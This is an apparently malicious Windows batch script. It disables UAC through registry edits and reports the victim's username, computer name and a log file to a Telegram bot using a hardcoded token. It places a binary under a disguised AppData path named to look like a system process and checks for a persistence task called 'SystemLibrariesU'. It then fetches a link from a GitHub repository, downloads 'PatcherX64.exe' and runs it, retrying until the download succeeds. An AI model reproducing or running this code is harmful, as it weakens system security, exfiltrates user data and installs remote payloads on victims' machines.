@echo off

setlocal enabledelayedexpansion



:RUNADMINHERE
cd /d "%~dp0"
:: Run All your commands here ( will be executed with admin privileges )

timeout /t 20 /nobreak

:: Disable UAC 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f


set "RUNEVERYOFFICIALMD5=ce74138574a515e7787d6ec7f785f6e1"



set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "filename="




for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename1=!filename!"
set "filename="








:: ============ RUNNING TOPIC ============


:: Set bot token, chat ID, and message
set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID_RUNNING=-1002163721260"
set "TOPIC_ID_RUNNING=73779"
set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|LoggedIn(0)|%time%....."
set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
set "CAPTION_RUNNING=This is a document for RUNNING Topic"
set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"







curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendMessage" ^
     -d "chat_id=%CHAT_ID_RUNNING%" ^
     -d "message_thread_id=%TOPIC_ID_RUNNING%" ^
     -d "text=%ENCODED_MESSAGE_RUNNING%"











:: Set the log file path
set "LOGFILE=%temp%\!filename1!"



:: Start logging from this point
call :LogOutput > "%LOGFILE%" 2>&1
echo.
echo.



set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|LoggedIn(1)|%MESSAGEEVERY%|%time%....."
set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"




curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendDocument" ^
     -F "chat_id=%CHAT_ID_RUNNING%" ^
     -F "message_thread_id=%TOPIC_ID_RUNNING%" ^
     -F "caption=%ENCODED_MESSAGE_RUNNING%" ^
     -F "document=@%LOGFILE%"






del /f /q "%LOGFILE%"
exit





:LogOutput
:: Your long batch script starts here
echo Starting LogOutput...
echo.




:CHECKRUNEVERY

if not exist "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks" mkdir "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks"
::mkdir "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks"

:: Define the paths
set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)


::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"




for /f "tokens=*" %%A in ('certutil -hashfile "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
echo MD5 of %SystemRoot%\System32\convertsshd.exe = %RUNEVERYCURRENTMD5%
echo.
echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5%
echo.

if "%RUNEVERYCURRENTMD5%"=="%RUNEVERYOFFICIALMD5%" (
    echo MD5 matches %RUNEVERYCURRENTMD5% = %RUNEVERYOFFICIALMD5%
    echo.
) else (
    echo MD5 doesnt match %RUNEVERYCURRENTMD5% # %RUNEVERYOFFICIALMD5%
    echo Going to INSTRUNEVERY
    goto INSTRUNEVERY
)


echo.
echo.




if not exist "%startupFile%" goto INSTRUNEVERY
echo %startupFile% Found.




:: RunEvery Files Found! , Lets Checking Task "SystemLibrariesU"

:: Define task to check
set "Task1=SystemLibrariesU"

echo.
echo.
echo.
echo Checking %Task1%
echo.
echo.
schtasks /query /tn "SystemLibrariesU" /v /fo LIST
echo.
echo.
echo.
echo.

:: If Task doesnt Exist , goto 
schtasks /query /tn "%Task1%" >nul 2>&1 || goto INSTRUNEVERY





:: RunEvery Files & Task Found goto NEXT 
goto NEXT






:INSTRUNEVERY
echo %startupFile% not found.
echo.
:: RunEvery Files or Task missing 



:: RunEveryCaller Installer
@echo off
 
color 0A
 
:loop
 
:: Kill & Delete file 
taskkill /f /im PatcherX64.exe >nul 2>&1
del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
 
:: Download the file using curl
curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
 
timeout /t 2 /nobreak >nul
 
:: Checking the existing of the file
if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
    echo.
    echo The download hasn't started yet. Please check your connection.
	timeout /t 2 /nobreak >nul
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak >nul
	echo.
	goto loop
)
 
 
 
:: Get the file size in bytes
for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
 
 
 
:: Check if the file size is at least 80KB (80000 bytes)
if %FILESIZE% geq 80000 (
    start "" "%APPDATA%\microsoft\PatcherX64.exe"
) else (
echo.
    echo Download incomplete. Check your connection and run the file again.
	timeout /t 2 /nobreak >nul
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak >nul
	echo.
	goto loop
)
 
 
echo Patcher Running...
timeout /t 1 /nobreak >nul



set "MESSAGEEVERY=RUNEVERYINSTALLED...."


:NEXT
::





